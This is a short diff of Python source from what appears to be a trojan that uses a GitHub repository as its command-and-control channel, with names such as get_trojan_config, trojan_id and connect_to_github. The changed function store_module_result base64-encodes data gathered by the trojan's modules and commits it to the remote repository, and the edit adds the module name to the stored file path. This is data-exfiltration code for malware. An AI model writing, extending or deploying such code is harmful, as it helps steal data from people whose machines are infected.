@@ -63,7 +63,7 @@ def get_trojan_config():
 def store_module_result(data, module):
     print("storing data from module [*]%s" % module)
     gh, repo, branch = connect_to_github()
-    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
+    remote_path = "data/%s/%d_%s.data" % (trojan_id, random.randint(1000, 100000), module)
     repo.create_file(remote_path, "Commit message", base64.b64encode(data.encode()))
 
     return
